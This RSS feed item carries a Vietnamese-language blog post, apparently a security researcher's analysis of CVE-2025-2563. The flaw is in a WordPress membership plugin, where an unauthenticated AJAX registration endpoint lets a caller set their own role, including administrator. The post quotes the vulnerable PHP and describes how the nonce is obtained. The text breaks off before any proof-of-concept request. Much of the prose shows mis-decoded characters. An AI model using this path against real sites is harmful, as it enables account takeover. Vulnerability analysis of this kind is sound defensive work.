<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Bui Van Y</title>
    <link>http://localhost:1313/vi/</link>
    <description>Bui Van Y</description>
    <generator>Hugo 0.153.2 &amp; FixIt v0.4.0-alpha.3-20251225101113-8ffb9a95</generator>
    <language>vi</language>
    <managingEditor>w41bu1@gmail.com (Bui Van Y)</managingEditor>
    <webMaster>w41bu1@gmail.com (Bui Van Y)</webMaster>
    <lastBuildDate>Wed, 07 Jan 2026 19:00:00 +0700</lastBuildDate>
    <atom:link href="http://localhost:1313/vi/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>CVE-2025-2563 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2026-01-07-cve-2025-2563/</link>
      <pubDate>Wed, 07 Jan 2026 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2026-01-07-cve-2025-2563/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2026-01-07-cve-2025-2563/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin WordPress &lt;strong&gt;User Registration &amp;amp; Membership&lt;/strong&gt; phi√™n b·∫£n &lt;strong&gt;tr∆∞·ªõc 4.1.2&lt;/strong&gt; &lt;strong&gt;kh√¥ng ngƒÉn ch·∫∑n ng∆∞·ªùi d√πng t·ª± thi·∫øt l·∫≠p vai tr√≤ t√†i kho·∫£n&lt;/strong&gt; khi &lt;strong&gt;Membership Addon ƒë∆∞·ª£c k√≠ch ho·∫°t&lt;/strong&gt;, d·∫´n ƒë·∫øn &lt;strong&gt;l·ªó h·ªïng leo thang ƒë·∫∑c quy·ªÅn&lt;/strong&gt; v√† cho ph√©p &lt;strong&gt;ng∆∞·ªùi d√πng ch∆∞a x√°c th·ª±c&lt;/strong&gt; gi√†nh ƒë∆∞·ª£c &lt;strong&gt;quy·ªÅn qu·∫£n tr·ªã (admin)&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-2563&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-2563&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Privilege Escalation&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 4.1.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 4.1.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/user-registration/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress User Registration Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;User Registration&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;4.1.1&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;4.1.2&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin ƒë√£ ƒëƒÉng k√Ω m·ªôt lo·∫°t c√°c action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function add_ajax_events() {&#xA;    $ajax_events = array(&#xA;        &amp;#39;create_membership&amp;#39;          =&amp;gt; false,&#xA;        &amp;#39;update_membership&amp;#39;          =&amp;gt; false,&#xA;        &amp;#39;delete_memberships&amp;#39;         =&amp;gt; false,&#xA;        &amp;#39;update_membership_status&amp;#39;   =&amp;gt; false,&#xA;        &amp;#39;create_member&amp;#39;              =&amp;gt; false,&#xA;        &amp;#39;update_member&amp;#39;              =&amp;gt; false,&#xA;        &amp;#39;delete_members&amp;#39;             =&amp;gt; false,&#xA;        &amp;#39;confirm_payment&amp;#39;            =&amp;gt; true,&#xA;        &amp;#39;create_stripe_subscription&amp;#39; =&amp;gt; true,&#xA;        &amp;#39;register_member&amp;#39;            =&amp;gt; true,&#xA;        &amp;#39;validate_coupon&amp;#39;            =&amp;gt; true,&#xA;        &amp;#39;cancel_subscription&amp;#39;        =&amp;gt; false,&#xA;        &amp;#39;get_group_memberships&amp;#39;      =&amp;gt; false,&#xA;        &amp;#39;create_membership_group&amp;#39;    =&amp;gt; false,&#xA;        &amp;#39;delete_membership_groups&amp;#39;   =&amp;gt; false,&#xA;        &amp;#39;verify_pages&amp;#39;               =&amp;gt; false,&#xA;        &amp;#39;validate_pg&amp;#39;                =&amp;gt; false,&#xA;    );&#xA;    foreach ( $ajax_events as $ajax_event =&amp;gt; $nopriv ) {&#xA;        add_action( &amp;#39;wp_ajax_user_registration_membership_&amp;#39; . $ajax_event, array( __CLASS__, $ajax_event ) );&#xA;        if ( $nopriv ) {&#xA;&#xA;            add_action(&#xA;                &amp;#39;wp_ajax_nopriv_user_registration_membership_&amp;#39; . $ajax_event,&#xA;                array(&#xA;                    __CLASS__,&#xA;                    $ajax_event,&#xA;                )&#xA;            );&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong danh s√°ch &lt;code&gt;$ajax_events&lt;/code&gt;, action &lt;strong&gt;&lt;code&gt;register_member&lt;/code&gt;&lt;/strong&gt; ƒë∆∞·ª£c ƒë√°nh d·∫•u &lt;code&gt;true&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;#39;register_member&amp;#39; =&amp;gt; true,&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ƒêi·ªÅu n√†y c√≥ nghƒ©a l√† plugin ƒëƒÉng k√Ω c·∫£:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;wp_ajax_user_registration_membership_register_member&#xA;wp_ajax_nopriv_user_registration_membership_register_member&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_*&lt;/code&gt; ‚Üí cho ng∆∞·ªùi d√πng ƒë√£ ƒëƒÉng nh·∫≠p&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_nopriv_*&lt;/code&gt; ‚Üí cho ng∆∞·ªùi d√πng &lt;strong&gt;ch∆∞a ƒëƒÉng nh·∫≠p (unauthenticated)&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;V√¨ v·∫≠y, &lt;strong&gt;b·∫•t k·ª≥ ai c≈©ng c√≥ th·ªÉ g·ª≠i request t·ªõi endpoint n√†y&lt;/strong&gt;, k·ªÉ c·∫£ attacker ch∆∞a x√°c th·ª±c.&lt;/p&gt;&#xA;&lt;p&gt;Khi request ƒë∆∞·ª£c g·ª≠i ƒë·∫øn endpoint &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; v·ªõi param &lt;code&gt;action=user_registration_membership_register_member&lt;/code&gt; th√¨ callback &lt;code&gt;register_member&lt;/code&gt; ƒë∆∞·ª£c g·ªçi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function register_member() {&#xA;    ur_membership_verify_nonce( &amp;#39;ur_members_frontend&amp;#39; ); // nonce verification.&#xA;    if ( ! isset( $_POST[&amp;#39;members_data&amp;#39;] ) ) {&#xA;        wp_send_json_error(&#xA;            array(&#xA;                &amp;#39;message&amp;#39; =&amp;gt; __( &amp;#39;Field members data is required.&amp;#39;, &amp;#39;user-registration&amp;#39; ),&#xA;            )&#xA;        );&#xA;    }&#xA;&#xA;    $data = apply_filters( &amp;#39;user_registration_membership_before_register_member&amp;#39;, isset( $_POST[&amp;#39;members_data&amp;#39;] ) ? (array) json_decode( wp_unslash( $_POST[&amp;#39;members_data&amp;#39;] ), true ) : array() );&#xA;&#xA;    if ( ! isset( $data[&amp;#39;username&amp;#39;] ) ) {&#xA;        wp_send_json_error(&#xA;            array(&#xA;                &amp;#39;message&amp;#39; =&amp;gt; __( &amp;#39;Field username is required.&amp;#39;, &amp;#39;user-registration&amp;#39; ),&#xA;            )&#xA;        );&#xA;    }&#xA;&#xA;    $membership_service      = new MembershipService();&#xA;    $response                = $membership_service-&amp;gt;create_membership_order_and_subscription( $data );&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;register_member()&lt;/code&gt; th·ª±c hi·ªán ki·ªÉm tra &lt;strong&gt;nonce&lt;/strong&gt; b·∫±ng c√°ch g·ªçi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;ur_membership_verify_nonce( &amp;#39;ur_members_frontend&amp;#39; );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a &lt;code&gt;ur_members_frontend&lt;/code&gt;, c√≥ th·ªÉ th·∫•y &lt;strong&gt;nonce ƒë∆∞·ª£c t·∫°o v·ªõi key &lt;code&gt;_nonce&lt;/code&gt;&lt;/strong&gt; thu·ªôc ƒë·ªëi t∆∞·ª£ng &lt;strong&gt;&lt;code&gt;ur_membership_frontend_localized_data&lt;/code&gt;&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-07-cve-2025-2563/nonce.png&#34; title=&#34;Nonce&#34; data-thumbnail=&#34;/posts/2026-01-07-cve-2025-2563/nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Create nonce&lt;/h2&gt;&lt;p&gt;Nonce&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-07-cve-2025-2563/nonce.png&#39; alt=&#34;Create nonce&#34; height=&#34;708&#34; width=&#34;1638&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Nonce&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Key v√† value n√†y ƒë∆∞·ª£c th√™m v√†o &lt;strong&gt;response khi truy c·∫≠p endpoint &lt;code&gt;/membership-registration/&lt;/code&gt;&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-07-cve-2025-2563/value.png&#34; title=&#34;Nonce in response&#34; data-thumbnail=&#34;/posts/2026-01-07-cve-2025-2563/value.png&#34; data-sub-html=&#34;&lt;h2&gt;Value&lt;/h2&gt;&lt;p&gt;Nonce in response&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-07-cve-2025-2563/value.png&#39; alt=&#34;Value&#34; height=&#34;565&#34; width=&#34;1558&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Nonce in response&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;alert alert-note&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z&#34;/&gt;&lt;/svg&gt;Ghi ch√∫&lt;/p&gt;&lt;p&gt;M·∫∑c ƒë·ªãnh, endpoint &lt;strong&gt;&lt;code&gt;/membership-registration/&lt;/code&gt;&lt;/strong&gt; ch·ªâ h·ªó tr·ª£ ƒëƒÉng k√Ω t√†i kho·∫£n v√† &lt;strong&gt;ch∆∞a th·ªÉ ƒëƒÉng k√Ω membership&lt;/strong&gt; n·∫øu module &lt;strong&gt;Membership&lt;/strong&gt; ch∆∞a ƒë∆∞·ª£c k√≠ch ho·∫°t.&#xA;ƒê·ªÉ s·ª≠ d·ª•ng ƒë·∫ßy ƒë·ªß ch·ª©c nƒÉng, c·∫ßn truy c·∫≠p &lt;strong&gt;&lt;code&gt;/wp-admin/admin.php?page=user-registration-dashboard#/features&lt;/code&gt;&lt;/strong&gt; v√† b·∫≠t module &lt;strong&gt;Membership&lt;/strong&gt;.&lt;/p&gt;&lt;/div&gt;&lt;p&gt;Sau khi ki·ªÉm tra &lt;strong&gt;nonce&lt;/strong&gt;, h√†m s·∫Ω l·∫•y d·ªØ li·ªáu t·ª´ &lt;strong&gt;&lt;code&gt;$_POST[&#39;members_data&#39;]&lt;/code&gt;&lt;/strong&gt;, th·ª±c hi·ªán &lt;strong&gt;&lt;code&gt;json_decode&lt;/code&gt;&lt;/strong&gt;, chuy·ªÉn th√†nh &lt;strong&gt;m·∫£ng&lt;/strong&gt; v√† g√°n v√†o bi·∫øn &lt;strong&gt;&lt;code&gt;$data&lt;/code&gt;&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$data = apply_filters(&#xA;    &amp;#39;user_registration_membership_before_register_member&amp;#39;,&#xA;    isset( $_POST[&amp;#39;members_data&amp;#39;] )&#xA;        ? (array) json_decode( wp_unslash( $_POST[&amp;#39;members_data&amp;#39;] ), true )&#xA;        : array()&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;N·∫øu &lt;strong&gt;&lt;code&gt;$data[&#39;username&#39;]&lt;/code&gt;&lt;/strong&gt; t·ªìn t·∫°i, h√†m s·∫Ω ti·∫øp t·ª•c g·ªçi &lt;strong&gt;&lt;code&gt;create_membership_order_and_subscription()&lt;/code&gt;&lt;/strong&gt; ƒë·ªÉ x·ª≠ l√Ω ƒëƒÉng k√Ω th√†nh vi√™n.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function create_membership_order_and_subscription( $data ) {&#xA;    try {&#xA;        $this-&amp;gt;members_repository-&amp;gt;wpdb()-&amp;gt;query( &amp;#39;START TRANSACTION&amp;#39; ); // Start the transaction.&#xA;        $members_data = $this-&amp;gt;members_service-&amp;gt;prepare_members_data( $data );&#xA;        $member       = get_user_by( &amp;#39;login&amp;#39;, $data[&amp;#39;username&amp;#39;] );&#xA;&#xA;        //update user source and add membership_role&#xA;        $this-&amp;gt;members_service-&amp;gt;update_user_meta( $members_data, $member-&amp;gt;ID );&#xA;        ...&#xA;    } catch ( Exception $e ) {&#xA;        ...&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong h√†m &lt;code&gt;create_membership_order_and_subscription()&lt;/code&gt;, d·ªØ li·ªáu ng∆∞·ªùi d√πng ƒë∆∞·ª£c x·ª≠ l√Ω th√¥ng qua &lt;code&gt;prepare_members_data( $data )&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function prepare_members_data( $data ) {&#xA;    if ( ! isset( $data[&amp;#39;role&amp;#39;] ) ) {&#xA;        $membership_details = $this-&amp;gt;membership_repository-&amp;gt;get_single_membership_by_ID( absint( $data[&amp;#39;membership&amp;#39;] ) );&#xA;        $membership_meta    = json_decode( $membership_details[&amp;#39;meta_value&amp;#39;], true );&#xA;        $data[&amp;#39;role&amp;#39;]       = $membership_meta[&amp;#39;role&amp;#39;] ?? &amp;#39;subscriber&amp;#39;;&#xA;    }&#xA;    $role = $data[&amp;#39;role&amp;#39;] ?? &amp;#39;subscriber&amp;#39;;&#xA;&#xA;    $coupon_details = array();&#xA;    if ( isset( $data[&amp;#39;coupon&amp;#39;] ) &amp;amp;&amp;amp; ! empty( $data[&amp;#39;coupon&amp;#39;] ) &amp;amp;&amp;amp; ur_check_module_activation( &amp;#39;coupon&amp;#39; ) ) {&#xA;        $coupon_details = ur_get_coupon_details( sanitize_text_field( $data[&amp;#39;coupon&amp;#39;] ) );&#xA;    }&#xA;&#xA;    $user_data = array(&#xA;        &amp;#39;user_login&amp;#39;    =&amp;gt; !empty( $data[&amp;#39;username&amp;#39;]) ? sanitize_text_field( $data[&amp;#39;username&amp;#39;] ) : &amp;#39;&amp;#39;,&#xA;        &amp;#39;user_email&amp;#39;    =&amp;gt; !empty($data[&amp;#39;email&amp;#39;]) ?  sanitize_email( $data[&amp;#39;email&amp;#39;] ) : &amp;#39;&amp;#39;,&#xA;        &amp;#39;user_pass&amp;#39;     =&amp;gt; !empty($data[&amp;#39;password&amp;#39;]) ? $data[&amp;#39;password&amp;#39;] : &amp;#39;&amp;#39;,&#xA;        &amp;#39;user_nicename&amp;#39; =&amp;gt; (!empty($data[&amp;#39;firstname&amp;#39;]) &amp;amp;&amp;amp; !empty($data[&amp;#39;lastname&amp;#39;])) ? sanitize_text_field( $data[&amp;#39;firstname&amp;#39;] ) . &amp;#39; &amp;#39; . sanitize_text_field( $data[&amp;#39;lastname&amp;#39;] ) : &amp;#39;&amp;#39;,&#xA;        &amp;#39;display_name&amp;#39;  =&amp;gt; !empty($data[&amp;#39;username&amp;#39;]) ? sanitize_text_field( $data[&amp;#39;username&amp;#39;] ) : &amp;#39;&amp;#39;,&#xA;        &amp;#39;first_name&amp;#39;    =&amp;gt; !empty($data[&amp;#39;firstname&amp;#39;]) ? sanitize_text_field( $data[&amp;#39;firstname&amp;#39;] ) : &amp;#39;&amp;#39;,&#xA;        &amp;#39;last_name&amp;#39;     =&amp;gt; !empty($data[&amp;#39;lastname&amp;#39;]) ? sanitize_text_field( $data[&amp;#39;lastname&amp;#39;] ) : &amp;#39;&amp;#39;,&#xA;        &amp;#39;user_status&amp;#39;   =&amp;gt; isset( $data[&amp;#39;member_status&amp;#39;] ) ? absint( $data[&amp;#39;member_status&amp;#39;] ) : 1,&#xA;    );&#xA;&#xA;    $membership_data = array(&#xA;        &amp;#39;membership&amp;#39;     =&amp;gt; absint( $data[&amp;#39;membership&amp;#39;] ),&#xA;        &amp;#39;start_date&amp;#39;     =&amp;gt; date( &amp;#39;Y-m-d&amp;#39;, strtotime( $data[&amp;#39;start_date&amp;#39;] ) ),&#xA;        &amp;#39;payment_method&amp;#39; =&amp;gt; sanitize_text_field( $data[&amp;#39;payment_method&amp;#39;] ?? &amp;#39;&amp;#39; ),&#xA;    );&#xA;&#xA;    return array(&#xA;        &amp;#39;role&amp;#39;            =&amp;gt; sanitize_text_field( $role ),&#xA;        &amp;#39;membership_data&amp;#39; =&amp;gt; $membership_data,&#xA;        &amp;#39;coupon_data&amp;#39;     =&amp;gt; $coupon_details,&#xA;        &amp;#39;user_data&amp;#39;       =&amp;gt; $user_data&#xA;    );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;N·∫øu &lt;strong&gt;&lt;code&gt;$data[&#39;role&#39;]&lt;/code&gt; kh√¥ng t·ªìn t·∫°i&lt;/strong&gt;, h·ªá th·ªëng s·∫Ω l·∫•y role t·ª´ &lt;strong&gt;metadata c·ªßa g√≥i membership&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$data[&amp;#39;role&amp;#39;] = $membership_meta[&amp;#39;role&amp;#39;] ?? &amp;#39;subscriber&amp;#39;;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ng∆∞·ª£c l·∫°i, n·∫øu &lt;strong&gt;&lt;code&gt;$data[&#39;role&#39;]&lt;/code&gt; ƒë∆∞·ª£c truy·ªÅn t·ª´ request&lt;/strong&gt;, gi√° tr·ªã n√†y s·∫Ω ƒë∆∞·ª£c s·ª≠ d·ª•ng tr·ª±c ti·∫øp:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$role = $data[&amp;#39;role&amp;#39;] ?? &amp;#39;subscriber&amp;#39;;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Sau ƒë√≥ role ƒë∆∞·ª£c ƒë∆∞a v√†o d·ªØ li·ªáu tr·∫£ v·ªÅ:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;return array(&#xA;    &amp;#39;role&amp;#39; =&amp;gt; sanitize_text_field( $role ),&#xA;    ...&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ƒêi·ªÅu n√†y ƒë·ªìng nghƒ©a v·ªõi vi·ªác &lt;strong&gt;ng∆∞·ªùi d√πng c√≥ th·ªÉ t·ª± truy·ªÅn tham s·ªë &lt;code&gt;role&lt;/code&gt; trong request&lt;/strong&gt; v√† &lt;strong&gt;ghi ƒë√® role m·∫∑c ƒë·ªãnh&lt;/strong&gt;, d·∫´n ƒë·∫øn kh·∫£ nƒÉng &lt;strong&gt;t·ª± g√°n quy·ªÅn cao h∆°n (v√≠ d·ª•: administrator)&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Sau ƒë√≥ h·ªá th·ªëng l·∫•y th√¥ng tin user b·∫±ng:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$member = get_user_by( &amp;#39;login&amp;#39;, $data[&amp;#39;username&amp;#39;] );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ti·∫øp theo, h√†m g·ªçi &lt;code&gt;update_user_meta()&lt;/code&gt; ƒë·ªÉ c·∫≠p nh·∫≠t &lt;strong&gt;user meta&lt;/strong&gt; v√† &lt;strong&gt;membership_role&lt;/strong&gt; cho ng∆∞·ªùi d√πng:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function update_user_meta( $data, $new_user_id ) {&#xA;    $user = new \WP_User( $new_user_id );&#xA;    update_user_meta( $new_user_id, &amp;#39;ur_registration_source&amp;#39;, &amp;#39;membership&amp;#39; );&#xA;    $user-&amp;gt;set_role( $data[&amp;#39;role&amp;#39;] );&#xA;    if ( ! empty( $data[&amp;#39;coupon_data&amp;#39;] ) ) {&#xA;        update_user_meta( $new_user_id, &amp;#39;ur_coupon_discount_type&amp;#39;, $data[&amp;#39;coupon_data&amp;#39;][&amp;#39;coupon_discount_type&amp;#39;] );&#xA;        update_user_meta( $new_user_id, &amp;#39;ur_coupon_discount&amp;#39;, $data[&amp;#39;coupon_data&amp;#39;][&amp;#39;coupon_discount&amp;#39;] );&#xA;    }&#xA;&#xA;    return $user;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;update_user_meta&lt;/code&gt; t·∫°o ƒë·ªïi t∆∞·ª£ng &lt;code&gt;WP_User&lt;/code&gt; t∆∞∆°ng ·ª©ng v·ªõi &lt;code&gt;id=$new_user_id&lt;/code&gt;, Thi·∫øt l·∫≠p role cho user tr·ª±c ti·∫øp t·ª´ d·ªØ li·ªáu ƒë·∫ßu v√†o:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$user-&amp;gt;set_role( $data[&amp;#39;role&amp;#39;] );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Kh√¥ng c√≥ b·∫•t k·ª≥ b∆∞·ªõc ki·ªÉm tra, gi·ªõi h·∫°n ho·∫∑c whitelist role h·ª£p l·ªá n√†o tr∆∞·ªõc khi g√°n role =&amp;gt; &lt;strong&gt;Privilege Escalation&lt;/strong&gt; x·∫£y ra.&lt;/p&gt;&#xA;&lt;div class=&#34;alert alert-note&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; 